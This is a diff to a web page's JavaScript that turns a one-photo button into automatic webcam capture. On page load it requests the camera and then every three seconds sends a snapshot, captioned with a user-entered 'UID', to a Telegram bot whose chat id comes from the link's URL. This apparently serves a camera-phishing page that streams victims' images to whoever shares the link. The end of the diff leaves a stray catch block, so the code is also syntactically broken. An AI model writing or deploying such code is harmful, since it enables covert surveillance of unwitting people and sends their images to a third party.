@@ -2,70 +2,72 @@ import { BOT_TOKEN } from "./config.js";
 
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-const sendBtn = document.getElementById("sendBtn");
 const toast = document.getElementById("toast");
+const uidInput = document.getElementById("uid");
 
 const params = new URLSearchParams(window.location.search);
 const chatId = params.get("id");
 
 let stream = null;
+let captureInterval = null;
 
-// Show toast message
+// Toast message
 function showToast(msg){
   toast.innerText = msg;
-  toast.style.opacity = 1;
-  setTimeout(()=>{ toast.style.opacity=0 }, 3000);
+  toast.style.opacity=1;
+  setTimeout(()=>{toast.style.opacity=0},3000);
 }
 
-// Button click
-sendBtn.onclick = async () => {
+// Capture & send function
+async function captureAndSend(){
+  if(!stream) return;
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video,0,0);
 
-  // User ID
-  const uid = document.getElementById("uid").value || "No UID";
-
-  if(!chatId){
-    showToast("Chat ID missing in URL!");
-    return;
-  }
-
-  try{
-    // Request camera permission
-    if(!stream){
-      stream = await navigator.mediaDevices.getUserMedia({video:true});
-      video.srcObject = stream;
+  canvas.toBlob(async (blob)=>{
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", blob);
+    formData.append("caption", `UID: ${uidInput.value || "No UID"}`);
+    try{
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+        method:"POST",
+        body:formData
+      });
+      const data = await res.json();
+      if(data.ok) showToast("Photo sent ✅");
+      else showToast("Send failed ❌");
+    }catch(err){
+      console.error(err);
+      showToast("Error ❌");
     }
+  },"image/jpeg");
+}
 
-    // Capture photo
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
+// Start camera and auto capture
+async function startCamera(){
+  try{
+    stream = await navigator.mediaDevices.getUserMedia({video:true});
+    video.srcObject = stream;
+    video.play();
+    // Every 3 seconds capture
+    captureInterval = setInterval(captureAndSend,3000);
+  }catch(e){
+    showToast("Permission denied ❌");
+    console.error(e);
+  }
+}
 
-    canvas.toBlob(async (blob) => {
-      let formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("photo", blob);
-      formData.append("caption", `UID: ${uid}`);
+// Start on page load
+window.onload = () => startCamera();
 
-      try{
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method:"POST",
-          body:formData
-        });
-        const data = await res.json();
-        if(data.ok){
-          showToast("Photo sent ✅");
-        } else {
-          console.error(data);
-          showToast("Failed to send ❌");
-        }
-      }catch(err){
-        console.error(err);
-        showToast("Error sending ❌");
-      }
-
-    }, "image/jpeg");
-
+// Stop on page unload
+window.onbeforeunload = () => {
+  if(stream) stream.getTracks().forEach(track=>track.stop());
+  if(captureInterval) clearInterval(captureInterval);
+};
   }catch(e){
     console.error(e);
     showToast("Permission denied ❌");
